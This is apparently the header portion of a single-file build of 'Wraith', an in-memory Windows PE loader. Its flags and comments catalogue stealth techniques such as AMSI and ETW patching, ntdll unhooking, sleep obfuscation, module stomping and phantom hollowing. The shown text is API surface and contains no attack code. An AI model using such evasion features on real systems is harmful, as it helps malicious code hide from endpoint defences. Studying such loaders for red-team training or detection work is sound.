/*
 * wraith.c - amalgamated single-file build of Wraith 1.0.0
 *               profile: default
 *               generated: 2026-04-27
 *
 * This is a self-contained drop-in build of the Wraith stealth PE
 * loader. It is functionally equivalent to compiling the canonical
 * CMake source tree with -DWRAITH_PROFILE=default, but condensed
 * into two files (.c + .h) for fast integration.
 *
 * To regenerate: from the project root, run
 *     python3 tools/amalgamate.py default
 *
 * License: MIT - see the LICENSE file shipped beside this header.
 */

/* === profile-locked feature gates === */
#ifndef WRAITH_FORWARDED_EXPORTS
#  define WRAITH_FORWARDED_EXPORTS 1
#endif
#ifndef WRAITH_DELAY_LOAD_IMPORTS
#  define WRAITH_DELAY_LOAD_IMPORTS 1
#endif
#ifndef WRAITH_BOUND_IMPORTS
#  define WRAITH_BOUND_IMPORTS 1
#endif
#ifndef WRAITH_REGISTER_SEH_X64
#  define WRAITH_REGISTER_SEH_X64 1
#endif
#ifndef WRAITH_TLS_FULL_LIFECYCLE
#  define WRAITH_TLS_FULL_LIFECYCLE 1
#endif
#ifndef WRAITH_RW_TO_RX_HYGIENE
#  define WRAITH_RW_TO_RX_HYGIENE 1
#endif
#ifndef WRAITH_USE_API_HASHING
#  define WRAITH_USE_API_HASHING 0
#endif
#ifndef WRAITH_USE_PEB_WALK
#  define WRAITH_USE_PEB_WALK 0
#endif
#ifndef WRAITH_USE_INDIRECT_SYSCALLS
#  define WRAITH_USE_INDIRECT_SYSCALLS 0
#endif
#ifndef WRAITH_USE_PEB_LINKAGE
#  define WRAITH_USE_PEB_LINKAGE 0
#endif
#ifndef WRAITH_USE_PHANTOM_HOLLOWING
#  define WRAITH_USE_PHANTOM_HOLLOWING 0
#endif
#ifndef WRAITH_USE_MODULE_STOMPING
#  define WRAITH_USE_MODULE_STOMPING 0
#endif
#ifndef WRAITH_USE_SLEEP_OBFUSCATION
#  define WRAITH_USE_SLEEP_OBFUSCATION 0
#endif
#ifndef WRAITH_USE_UNHOOK_NTDLL
#  define WRAITH_USE_UNHOOK_NTDLL 0
#endif
#ifndef WRAITH_USE_ETW_PATCH
#  define WRAITH_USE_ETW_PATCH 0
#endif
#ifndef WRAITH_USE_AMSI_PATCH
#  define WRAITH_USE_AMSI_PATCH 0
#endif
#ifndef WRAITH_USE_STACK_SPOOF
#  define WRAITH_USE_STACK_SPOOF 0
#endif
#ifndef WRAITH_USE_HWBP_HOOKS
#  define WRAITH_USE_HWBP_HOOKS 0
#endif
#ifndef WRAITH_USE_PRIVATE_NTDLL
#  define WRAITH_USE_PRIVATE_NTDLL 0
#endif
#ifndef WRAITH_USE_THREADLESS_EXEC
#  define WRAITH_USE_THREADLESS_EXEC 0
#endif
#ifndef WRAITH_USE_PAGE_GUARD_ENCRYPT
#  define WRAITH_USE_PAGE_GUARD_ENCRYPT 0
#endif
#ifndef WRAITH_USE_HEAP_MASQUERADE
#  define WRAITH_USE_HEAP_MASQUERADE 0
#endif
#ifndef WRAITH_USE_ANTI_DEBUG_SPOOF
#  define WRAITH_USE_ANTI_DEBUG_SPOOF 0
#endif
#ifndef WRAITH_USE_HOST_IAT_REDIRECT
#  define WRAITH_USE_HOST_IAT_REDIRECT 0
#endif
#ifndef WRAITH_DEBUG_LOG
#  define WRAITH_DEBUG_LOG 0
#endif
#ifndef WRAITH_TRACE_PIPELINE
#  define WRAITH_TRACE_PIPELINE 0
#endif
#ifndef WRAITH_HASH_ALGO_djb2
#  define WRAITH_HASH_ALGO_djb2 1
#endif
#ifndef WRAITH_SLEEP_ALGO_ekko
#  define WRAITH_SLEEP_ALGO_ekko 1
#endif
#ifndef WRAITH_SC_RESOLVER_hellshall
#  define WRAITH_SC_RESOLVER_hellshall 1
#endif
#ifndef WRAITH_MAP_DEFAULT_private_rwx
#  define WRAITH_MAP_DEFAULT_private_rwx 1
#endif
#ifndef WRAITH_HASH_ALGO_NAME
#  define WRAITH_HASH_ALGO_NAME "djb2"
#endif
#ifndef WRAITH_SLEEP_ALGO_NAME
#  define WRAITH_SLEEP_ALGO_NAME "ekko"
#endif
#ifndef WRAITH_SC_RESOLVER_NAME
#  define WRAITH_SC_RESOLVER_NAME "hellshall"
#endif
#ifndef WRAITH_PROFILE_NAME
#  define WRAITH_PROFILE_NAME "default"
#endif
#ifndef WRAITH_VERSION_STRING
#  define WRAITH_VERSION_STRING "1.0.0"
#endif


/* ==========================================================================
 * system includes
 * ========================================================================== */

#include <windows.h>
#include <winternl.h>
#include <winnt.h>

#include <stdarg.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <intrin.h>


/* ==========================================================================
 * public API headers (inlined)
 * ========================================================================== */


/* ==========================================================================
 * include/wraith/wraith_types.h
 * ========================================================================== */

/*
 * include/wraith/wraith_types.h
 *
 * Opaque handles, primitive types, and enums for the Wraith public
 * API. This header is C99-clean and intentionally avoids dragging in
 * <windows.h> at the public surface - consumers that only need to hold a
 * handle and call wraith_load_library should not be forced to include the SDK.
 *
 * Anything that needs Windows types lives in wr_compat.h or wr_resource.h.
 */

#ifndef WRAITH_TYPES_H
#define WRAITH_TYPES_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* -------------------------------------------------------------------------
 * Opaque handles.
 *
 * wraith_handle_t is a context produced by wraith_load_library and consumed
 * by every WRAITH_* call. It is intentionally a typed opaque pointer (not
 * void*) so the compiler refuses to mix it with HMODULE / HANDLE / void*
 * by accident.
 *
 * wraith_resource_t is an opaque handle into the loaded image's `.rsrc`
 * directory.
 * wraith_foreign_module_t is a handle to a *dependency* module (resolved
 * during import processing).
 * ------------------------------------------------------------------------- */
typedef struct wr_ctx  *wraith_handle_t;
typedef struct wr_resource  *wraith_resource_t;
typedef struct wr_foreign  *wraith_foreign_module_t;

/* -------------------------------------------------------------------------
 * Memory protection flags as understood by mapping vtables.
 *
 * These are an internal, stable subset of PAGE_* / MEM_* values - by going
 * through this enum the loader avoids leaking <windows.h> macros into the
 * public surface and also enforces RW->RX hygiene at the type level: there
 * is no WRAITH_PROT_RWX value, only the legitimate combinations.
 * ------------------------------------------------------------------------- */
typedef enum wr_prot {
  WRAITH_PROT_NOACCESS  = 0x00,
  WRAITH_PROT_R  = 0x01,  /* read-only data  */
  WRAITH_PROT_RW  = 0x02,  /* writable data  */
  WRAITH_PROT_RX  = 0x04,  /* executable code  */
  WRAITH_PROT_WC  = 0x08,  /* writecopy (CoW)  */
  WRAITH_PROT_RWC  = 0x10,  /* read + writecopy  */
  WRAITH_PROT_RXC  = 0x20,  /* RX + writecopy  */
  WRAITH_PROT_NOCACHE  = 0x100, /* OR'd with one of above  */
  WRAITH_PROT_GUARD  = 0x200  /* OR'd with one of above  */
} wraith_prot_t;

/* -------------------------------------------------------------------------
 * Image type produced by the loader.
 * ------------------------------------------------------------------------- */
typedef enum wr_image_type {
  WRAITH_IMAGE_UNKNOWN = 0,
  WRAITH_IMAGE_DLL  = 1,
  WRAITH_IMAGE_EXE  = 2
} wraith_image_type_t;

/* -------------------------------------------------------------------------
 * Mapping strategy. See doc/TECHNIQUES.md for an in-depth comparison.
 *
 *  PRIVATE_RW_RX  - default. NtAllocateVirtualMemory + RW->RX flip.
 *  Stable, but produces an unbacked MEM_PRIVATE region.
 *  PHANTOM_HOLLOW  - NtCreateSection(SEC_IMAGE) backed by a legitimate
 *  Microsoft DLL. The region presents as MEM_IMAGE.
 *  MODULE_STOMPING  - overlay payload onto an already-loaded legitimate
 *  module. Lab-only - destroys the host module's .text.
 *  MOCKINGJAY  - hunt for pre-existing MEM_IMAGE+RWX regions in the
 *  process and reuse them. Zero new allocations.
 * ------------------------------------------------------------------------- */
typedef enum wr_map_strategy {
  WRAITH_MAP_PRIVATE_RW_RX  = 0,
  WRAITH_MAP_PHANTOM_HOLLOW  = 1,
  WRAITH_MAP_MODULE_STOMPING  = 2,
  WRAITH_MAP_MOCKINGJAY  = 3
} wraith_map_strategy_t;

/* -------------------------------------------------------------------------
 * Sleep obfuscation algorithm (only consulted when WRAITH_F_SLEEP_OBFUSCATION
 * is set in wraith_load_options.flags).
 *
 *  XOR  - simple XOR-on-thread baseline (didactic)
 *  EKKO  - timer queue + CONTEXT-driven encrypt/wait/decrypt (default)
 *  FOLIAGE - NtContinue-based, single-shot
 *  CRONOS  - APC chain + waitable timer; RIP stays kernel-side during idle
 * ------------------------------------------------------------------------- */
typedef enum wr_sleep_algo {
  WRAITH_SLEEP_XOR  = 0,
  WRAITH_SLEEP_EKKO  = 1,
  WRAITH_SLEEP_FOLIAGE = 2,
  WRAITH_SLEEP_CRONOS  = 3
} wraith_sleep_algo_t;

/* -------------------------------------------------------------------------
 * Bitwise feature flags for wraith_load_options.flags. Independent from the
 * compile-time WRAITH_USE_* macros - if a feature was compiled-out at build
 * time, requesting it at runtime returns WRAITH_E_FEATURE_DISABLED.
 * ------------------------------------------------------------------------- */
typedef uint64_t wraith_flags_t;

#define WRAITH_F_NONE  ((wraith_flags_t)0)
/* Classic stealth */
#define WRAITH_F_API_HASHING  ((wraith_flags_t)1ULL <<  0)
#define WRAITH_F_PEB_WALK  ((wraith_flags_t)1ULL <<  1)
#define WRAITH_F_INDIRECT_SYSCALLS  ((wraith_flags_t)1ULL <<  2)
#define WRAITH_F_PEB_LINKAGE  ((wraith_flags_t)1ULL <<  3)
#define WRAITH_F_SLEEP_OBFUSCATION  ((wraith_flags_t)1ULL <<  4)
#define WRAITH_F_UNHOOK_NTDLL  ((wraith_flags_t)1ULL <<  5)
#define WRAITH_F_ETW_PATCH  ((wraith_flags_t)1ULL <<  6)
#define WRAITH_F_AMSI_PATCH  ((wraith_flags_t)1ULL <<  7)
/* Bleeding-edge tier */
#define WRAITH_F_STACK_SPOOF  ((wraith_flags_t)1ULL <<  8)
#define WRAITH_F_HWBP_HOOKS  ((wraith_flags_t)1ULL <<  9)
#define WRAITH_F_PRIVATE_NTDLL  ((wraith_flags_t)1ULL << 10)
#define WRAITH_F_THREADLESS_EXEC  ((wraith_flags_t)1ULL << 11)
#define WRAITH_F_PAGE_GUARD_ENCRYPT  ((wraith_flags_t)1ULL << 12)
#define WRAITH_F_HEAP_MASQUERADE  ((wraith_flags_t)1ULL << 13)
#define WRAITH_F_ANTI_DEBUG_SPOOF  ((wraith_flags_t)1ULL << 14)
#define WRAITH_F_HOST_IAT_REDIRECT  ((wraith_flags_t)1ULL << 15)
/* Reliability toggles (rarely cleared) */
#define WRAITH_F_REGISTER_SEH_X64  ((wraith_flags_t)1ULL << 32)
#define WRAITH_F_FORWARDED_EXPORTS  ((wraith_flags_t)1ULL << 33)
#define WRAITH_F_DELAY_LOAD_IMPORTS  ((wraith_flags_t)1ULL << 34)
#define WRAITH_F_BOUND_IMPORTS  ((wraith_flags_t)1ULL << 35)
#define WRAITH_F_TLS_FULL_LIFECYCLE  ((wraith_flags_t)1ULL << 36)

/* Convenience presets (not stored - resolved by the loader at WRAITH_Load). */
#define WRAITH_F_RELIABILITY_ALL  (WRAITH_F_REGISTER_SEH_X64 | \
  WRAITH_F_FORWARDED_EXPORTS | \
  WRAITH_F_DELAY_LOAD_IMPORTS | \
  WRAITH_F_BOUND_IMPORTS | \
  WRAITH_F_TLS_FULL_LIFECYCLE)

#define WRAITH_F_PARANOID_FULL  (WRAITH_F_API_HASHING | \
  WRAITH_F_PEB_WALK | \
  WRAITH_F_INDIRECT_SYSCALLS | \
  WRAITH_F_PEB_LINKAGE | \
  WRAITH_F_SLEEP_OBFUSCATION | \
  WRAITH_F_ETW_PATCH | \
  WRAITH_F_AMSI_PATCH | \
  WRAITH_F_STACK_SPOOF | \
  WRAITH_F_HWBP_HOOKS | \
  WRAITH_F_PRIVATE_NTDLL | \
  WRAITH_F_THREADLESS_EXEC | \
  WRAITH_F_PAGE_GUARD_ENCRYPT | \
  WRAITH_F_HEAP_MASQUERADE | \
  WRAITH_F_ANTI_DEBUG_SPOOF | \
  WRAITH_F_RELIABILITY_ALL)

#ifdef __cplusplus
}  /* extern "C" */
#endif

#endif  /* WRAITH_TYPES_H */


/* ==========================================================================
 * include/wraith/wraith_status.h
 * ========================================================================== */

/*
 * include/wraith/wraith_status.h
 *
 * Rich error codes returned by every WRAITH_* entry point.
 *
 * Each error code maps deterministically to a category. Consumers can
 * switch on the category to decide retry vs. propagate without
 * enumerating every leaf code.
 */

#ifndef WRAITH_STATUS_H
#define WRAITH_STATUS_H

#ifdef __cplusplus
extern "C" {
#endif

typedef int32_t wraith_status_t;

/* Top-level categories - the upper byte of wraith_status_t encodes the category. */
#define WRAITH_CAT(s)  (((s) >> 24) & 0xff)

#define WRAITH_CAT_OK  0x00
#define WRAITH_CAT_INVALID_ARG  0x01
#define WRAITH_CAT_PE_FORMAT  0x02
#define WRAITH_CAT_RESOURCE  0x03
#define WRAITH_CAT_MAPPING  0x04
#define WRAITH_CAT_RELOCATIONS  0x05
#define WRAITH_CAT_IMPORTS  0x06
#define WRAITH_CAT_EXPORTS  0x07
#define WRAITH_CAT_TLS  0x08
#define WRAITH_CAT_SEH  0x09
#define WRAITH_CAT_RUNTIME  0x0a
#define WRAITH_CAT_SYSCALL  0x0b
#define WRAITH_CAT_STEALTH  0x0c
#define WRAITH_CAT_FEATURE  0x0d
#define WRAITH_CAT_INTERNAL  0x0e

#define WRAITH_MAKE_STATUS(cat, sub)  (((wraith_status_t)(cat) << 24) | (wraith_status_t)(sub))

/* ============================ WRAITH_CAT_OK ============================ */
#define WRAITH_OK  WRAITH_MAKE_STATUS(WRAITH_CAT_OK,  0x00)

/* ============================ INVALID_ARG ============================ */
#define WRAITH_E_NULL_ARG  WRAITH_MAKE_STATUS(WRAITH_CAT_INVALID_ARG, 0x01)
#define WRAITH_E_INVALID_HANDLE  WRAITH_MAKE_STATUS(WRAITH_CAT_INVALID_ARG, 0x02)
#define WRAITH_E_INVALID_OPTIONS  WRAITH_MAKE_STATUS(WRAITH_CAT_INVALID_ARG, 0x03)
#define WRAITH_E_BUFFER_TOO_SMALL  WRAITH_MAKE_STATUS(WRAITH_CAT_INVALID_ARG, 0x04)

/* =============================== PE_FORMAT =========================== */
#define WRAITH_E_PE_TRUNCATED  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x01)
#define WRAITH_E_PE_BAD_DOS_MAGIC  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x02)
#define WRAITH_E_PE_BAD_NT_MAGIC  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x03)
#define WRAITH_E_PE_WRONG_MACHINE  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x04)
#define WRAITH_E_PE_BAD_OPT_MAGIC  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x05)
#define WRAITH_E_PE_BAD_ALIGNMENT  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x06)
#define WRAITH_E_PE_BAD_SECTION  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x07)
#define WRAITH_E_PE_SIZE_MISMATCH  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x08)
#define WRAITH_E_PE_OVERFLOW  WRAITH_MAKE_STATUS(WRAITH_CAT_PE_FORMAT,  0x09)

/* =============================== RESOURCE ============================ */
#define WRAITH_E_RES_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_RESOURCE,  0x01)
#define WRAITH_E_RES_TYPE_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_RESOURCE,  0x02)
#define WRAITH_E_RES_NAME_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_RESOURCE,  0x03)
#define WRAITH_E_RES_LANG_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_RESOURCE,  0x04)

/* =============================== MAPPING ============================== */
#define WRAITH_E_MAP_RESERVE_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_MAPPING,  0x01)
#define WRAITH_E_MAP_COMMIT_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_MAPPING,  0x02)
#define WRAITH_E_MAP_PROTECT_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_MAPPING,  0x03)
#define WRAITH_E_MAP_NO_HOST_DLL  WRAITH_MAKE_STATUS(WRAITH_CAT_MAPPING,  0x04)
#define WRAITH_E_MAP_HOST_TOO_SMALL  WRAITH_MAKE_STATUS(WRAITH_CAT_MAPPING,  0x05)
#define WRAITH_E_MAP_RWX_LEAK  WRAITH_MAKE_STATUS(WRAITH_CAT_MAPPING,  0x06)

/* ============================= RELOCATIONS ============================ */
#define WRAITH_E_RELOC_NOT_RELOCATABLE  WRAITH_MAKE_STATUS(WRAITH_CAT_RELOCATIONS, 0x01)
#define WRAITH_E_RELOC_BAD_TYPE  WRAITH_MAKE_STATUS(WRAITH_CAT_RELOCATIONS, 0x02)

/* =============================== IMPORTS ============================== */
#define WRAITH_E_IMP_DLL_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_IMPORTS,  0x01)
#define WRAITH_E_IMP_PROC_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_IMPORTS,  0x02)
#define WRAITH_E_IMP_FORWARDER_LOOP  WRAITH_MAKE_STATUS(WRAITH_CAT_IMPORTS,  0x03)
#define WRAITH_E_IMP_DELAY_BAD_DESCR  WRAITH_MAKE_STATUS(WRAITH_CAT_IMPORTS,  0x04)

/* =============================== EXPORTS ============================== */
#define WRAITH_E_EXP_NOT_FOUND  WRAITH_MAKE_STATUS(WRAITH_CAT_EXPORTS,  0x01)
#define WRAITH_E_EXP_BAD_ORDINAL  WRAITH_MAKE_STATUS(WRAITH_CAT_EXPORTS,  0x02)
#define WRAITH_E_EXP_NO_TABLE  WRAITH_MAKE_STATUS(WRAITH_CAT_EXPORTS,  0x03)

/* ================================ TLS ================================= */
#define WRAITH_E_TLS_CALLBACK_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_TLS,  0x01)

/* ================================ SEH ================================= */
#define WRAITH_E_SEH_NO_PDATA  WRAITH_MAKE_STATUS(WRAITH_CAT_SEH,  0x01)
#define WRAITH_E_SEH_REGISTER_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_SEH,  0x02)

/* =============================== RUNTIME ============================== */
#define WRAITH_E_RT_PEB_WALK_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_RUNTIME,  0x01)
#define WRAITH_E_RT_API_NOT_RESOLVED  WRAITH_MAKE_STATUS(WRAITH_CAT_RUNTIME,  0x02)
#define WRAITH_E_RT_DLLMAIN_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_RUNTIME,  0x03)

/* =============================== SYSCALL ============================== */
#define WRAITH_E_SC_SSN_NOT_RESOLVED  WRAITH_MAKE_STATUS(WRAITH_CAT_SYSCALL,  0x01)
#define WRAITH_E_SC_NO_GADGET  WRAITH_MAKE_STATUS(WRAITH_CAT_SYSCALL,  0x02)
#define WRAITH_E_SC_INVOKE_FAILED  WRAITH_MAKE_STATUS(WRAITH_CAT_SYSCALL,  0x03)

/* =============================== STEALTH ============================== */
#define WRAITH_E_STEALTH_INSTALL  WRAITH_MAKE_STATUS(WRAITH_CAT_STEALTH,  0x01)
#define WRAITH_E_STEALTH_INCOMPATIBLE  WRAITH_MAKE_STATUS(WRAITH_CAT_STEALTH,  0x02)

/* =============================== FEATURE ============================== */
#define WRAITH_E_FEATURE_DISABLED  WRAITH_MAKE_STATUS(WRAITH_CAT_FEATURE,  0x01)

/* =============================== INTERNAL ============================= */
#define WRAITH_E_OOM  WRAITH_MAKE_STATUS(WRAITH_CAT_INTERNAL,  0x01)
#define WRAITH_E_UNEXPECTED  WRAITH_MAKE_STATUS(WRAITH_CAT_INTERNAL,  0x02)

/* ----------------------------------------------------------------------
 * Helpers
 * ---------------------------------------------------------------------- */

/* Returns a static, NUL-terminated ASCII string for the given status. */
const char *wraith_status_string(wraith_status_t s);

/* Returns a human-readable label for the category byte. */
const char *wraith_category_string(int category);

#define WRAITH_SUCCESS(s)  ((s) == WRAITH_OK)
#define WRAITH_FAILED(s)  ((s) != WRAITH_OK)

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_STATUS_H */


/* ==========================================================================
 * include/wraith/wraith_options.h
 * ========================================================================== */

/*
 * include/wraith/wraith_options.h
 *
 * wraith_load_options - per-load configuration. Passed to wraith_load_library.
 * Designated-initializer friendly: callers write only the fields they
 * care about; defaults are documented field-by-field.
 */

#ifndef WRAITH_OPTIONS_H
#define WRAITH_OPTIONS_H


#ifdef __cplusplus
extern "C" {
#endif

/* -------------------------------------------------------------------------
 * Custom callback signatures.
 *
 * void* / size_t / uint32_t are used at the public surface to avoid
 * pulling in <windows.h> here.
 * ------------------------------------------------------------------------- */
typedef void *(*wraith_alloc_fn)(void *address, size_t size,
  uint32_t alloc_type, uint32_t protect,
  void *userdata);
typedef int  (*wraith_free_fn)(void *address, size_t size,
  uint32_t free_type, void *userdata);
typedef wraith_foreign_module_t (*WRAITH_LoadLibFn)(const char *name, void *userdata);
typedef void *(*WRAITH_GetProcFn)(wraith_foreign_module_t m, const char *name,
  void *userdata);
typedef void  (*WRAITH_FreeLibFn)(wraith_foreign_module_t m, void *userdata);

/* -------------------------------------------------------------------------
 * Telemetry hook - called once at the end of each pipeline phase. Useful
 * for the curriculum-side tooling (ioc_audit.py reads logged events).
 *
 * `phase_id` matches the 17-step pipeline in doc/ARCHITECTURE.md
 * (1=validate, 2=alloc_ctx, ..., 17=return).
 * ------------------------------------------------------------------------- */
typedef void (*wraith_trace_fn)(int phase_id, const char *phase_name,
  wraith_status_t status, void *userdata);

/* -------------------------------------------------------------------------
 * wraith_load_options
 *
 * Defaults (zero-initialized struct = "behavior"):
 *  - map_strategy = WRAITH_MAP_PRIVATE_RW_RX
 *  - flags  = WRAITH_F_RELIABILITY_ALL  (compile-time gates apply)
 *  - sleep_algo  = WRAITH_SLEEP_EKKO
 *  - sleep_jitter_ms = 0 (no sleep obfuscation unless flag set)
 *  - masquerade  = NULL  (use original PE name when PEB linkage on)
 *  - host_dll  = NULL  (auto-pick from curated list when phantom on)
 *  - all callbacks = NULL (use built-in defaults)
 * ------------------------------------------------------------------------- */
typedef struct wr_load_options {
  /* --- core --- */
  wraith_map_strategy_t map_strategy;
  wraith_flags_t  flags;

  /* --- sleep obfuscation (consulted iff WRAITH_F_SLEEP_OBFUSCATION) --- */
  wraith_sleep_algo_t  sleep_algo;
  uint32_t  sleep_jitter_ms;  /* 0 = no jitter */

  /* --- PEB linkage (consulted iff WRAITH_F_PEB_LINKAGE) --- */
  const wchar_t  *masquerade;  /* e.g. L"winnet.dll"  */
  const wchar_t  *masquerade_path;  /* full Windows path; NULL = synthesize */

  /* --- phantom hollowing (consulted iff map_strategy == PHANTOM_HOLLOW) --- */
  const wchar_t  *host_dll;  /* full path; NULL = curated picker */

  /* --- module stomping (consulted iff map_strategy == MODULE_STOMPING) --- */
  const wchar_t  *stomp_target;  /* full path; NULL = picker */

  /* --- consumer-supplied callbacks (override built-in defaults) --- */
  wraith_alloc_fn  alloc;
  wraith_free_fn  freefn;
  WRAITH_LoadLibFn  loadlib;
  WRAITH_GetProcFn  getproc;
  WRAITH_FreeLibFn  freelib;
  void  *userdata;

  /* --- diagnostics --- */
  wraith_trace_fn  trace;  /* fired per-phase; NULL = silent */
  void  *trace_userdata;

  /* Reserved padding so future fields don't break ABI for early adopters. */
  uintptr_t  _reserved[8];
} wraith_load_options;

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_OPTIONS_H */


/* ==========================================================================
 * include/wraith/wraith_introspect.h
 * ========================================================================== */

/*
 * include/wraith/wraith_introspect.h
 *
 * Optional debug/introspection surface. Useful for tooling
 * (e.g. tools/ioc_audit.py) and tests that need to peek into the loaded
 * image without re-parsing the PE.
 *
 * Compiled out when WRAITH_DEBUG_LOG is OFF and WRAITH_BUILD_TESTS is OFF.
 */

#ifndef WRAITH_INTROSPECT_H
#define WRAITH_INTROSPECT_H


#ifdef __cplusplus
extern "C" {
#endif

typedef struct wr_section_info {
  char  name[9];  /* IMAGE_SIZEOF_SHORT_NAME + NUL */
  void  *base;  /* virtual address inside loaded image */
  size_t  size;  /* page-aligned size */
  uint32_t  characteristics;  /* IMAGE_SCN_* bits */
  wraith_prot_t  final_prot;  /* protection after FinalizeSections */
} wr_section_info;

typedef struct wr_export_info {
  const char *name;  /* may be NULL for ordinal-only exports */
  uint16_t  ordinal;
  void  *address;
  int  is_forwarded;  /* 1 if export is "DLL!Func" string */
  const char *forward_target;  /* valid when is_forwarded == 1 */
} wr_export_info;

typedef struct wr_import_info {
  const char *dll_name;
  const char *symbol_name;  /* NULL for ordinal-by-number imports */
  uint16_t  ordinal;
  void  *resolved_address;
} wr_import_info;

/* -------------------------------------------------------------------------
 * Iteration. The callback returns 0 to continue, non-zero to stop.
 * ------------------------------------------------------------------------- */

typedef int (*wr_section_visitor)(const wr_section_info *info, void *userdata);
typedef int (*wr_export_visitor)(const wr_export_info *info, void *userdata);
typedef int (*wr_import_visitor)(const wr_import_info *info, void *userdata);

wraith_status_t wraith_for_each_section(wraith_handle_t h, wr_section_visitor cb, void *userdata);
wraith_status_t wraith_for_each_export(wraith_handle_t  h, wr_export_visitor  cb, void *userdata);
wraith_status_t wraith_for_each_import(wraith_handle_t  h, wr_import_visitor  cb, void *userdata);

/* -------------------------------------------------------------------------
 * Lookup the loaded image base address (for callers that want to compute
 * RVAs themselves, e.g. tests that grep for RWX regions).
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_get_image_base(wraith_handle_t h, void **out_base, size_t *out_size);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_INTROSPECT_H */


/* ==========================================================================
 * include/wraith/wraith_loader.h
 * ========================================================================== */

/*
 * include/wraith/wraith_loader.h
 *
 * Primary entry points. All return wraith_status_t; the produced handle (if
 * any) is written to an out-parameter. Pointers are typed and never aliased
 * with HMODULE / HANDLE / void* in the public surface.
 */

#ifndef WRAITH_LOADER_H
#define WRAITH_LOADER_H



#ifdef __cplusplus
extern "C" {
#endif

/* -------------------------------------------------------------------------
 * Load a DLL or EXE from an in-memory PE buffer.
 *
 * `buffer`  : pointer to the start of the PE image (DOS header).
 * `size`  : length of `buffer` in bytes.
 * `options` : may be NULL - equivalent to passing a zero-initialized struct
 *  (no stealth features active).
 * `out`  : on WRAITH_OK, receives a non-NULL wraith_handle_t. On failure,
 *  *out is set to NULL.
 *
 * On error the error code categorizes which pipeline phase failed; callers
 * can look at wraith_last_error() for a free-form description.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_load_library(const void *buffer, size_t size,
  const wraith_load_options *options,
  wraith_handle_t *out);

/* -------------------------------------------------------------------------
 * Resolve an export by name or ordinal.
 *
 * Pass the ordinal value cast to (const char*) to look up by ordinal.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_get_proc_address(wraith_handle_t h, const char *name,
  void **out_proc);

/* -------------------------------------------------------------------------
 * Run an EXE entry point. Returns WRAITH_E_INVALID_HANDLE for DLL handles or
 * if the image had no entry point.
 *
 * The loaded EXE owns the process from this point. `out_exit_code` is
 * written only if the loaded EXE returns normally (rare for full EXEs).
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_call_entry_point(wraith_handle_t h, int *out_exit_code);

/* -------------------------------------------------------------------------
 * Release the loaded image. After this call the handle is invalid.
 *
 * For DLL handles: invokes DLL_PROCESS_DETACH, runs TLS DETACH callbacks
 * (when WRAITH_F_TLS_FULL_LIFECYCLE was set), unwinds RtlAddFunctionTable,
 * removes PEB.Ldr entry (if WRAITH_F_PEB_LINKAGE), restores the host's .text
 * (if MODULE_STOMPING), and finally releases all tracked allocations.
 *
 * Calling this with a NULL handle is a no-op and returns WRAITH_OK.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_free_library(wraith_handle_t h);

/* -------------------------------------------------------------------------
 * Diagnostic helpers - always available, even when WRAITH_DEBUG_LOG is off.
 * ------------------------------------------------------------------------- */

/* Returns the most recent free-form error description for the current
 * thread. The string is owned by the loader and is overwritten by the next
 * WRAITH_* call on the same thread. May be empty. */
const char *wraith_last_error(void);

/* Returns the version string ("Wraith <profile> <semver>"). */
const char *wraith_version(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_LOADER_H */


/* ==========================================================================
 * include/wraith/wraith_resource.h
 * ========================================================================== */

/*
 * include/wraith/wraith_resource.h
 *
 * Resource (.rsrc) walking API. Returns wraith_status_t for every entry
 * point (no NULL-handle convention).
 *
 * This header includes <windows.h> indirectly via LPCTSTR, because the
 * resource API has to interop with RT_*, MAKEINTRESOURCE, etc.
 * Consumers that want to avoid <windows.h> can stick to byte-level
 * wraith_find_resource + wraith_load_resource_data.
 */

#ifndef WRAITH_RESOURCE_H
#define WRAITH_RESOURCE_H


#ifdef __cplusplus
extern "C" {
#endif

/* Default language constant - 0 means "any language" / neutral. */
#define WRAITH_LANG_DEFAULT  ((uint16_t)0)

/* -------------------------------------------------------------------------
 * Find a resource entry. `name` and `type` accept either an ASCII string
 * or an integer cast to (const char*) - same idiom as Win32 RT_RCDATA etc.
 *
 * `language` may be WRAITH_LANG_DEFAULT to use the calling thread's locale.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_find_resource(wraith_handle_t h,
  const void *name, const void *type,
  uint16_t language,
  wraith_resource_t *out);

/* -------------------------------------------------------------------------
 * Get the size of a previously-found resource, in bytes.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_sizeof_resource(wraith_handle_t h, wraith_resource_t r,
  size_t *out_size);

/* -------------------------------------------------------------------------
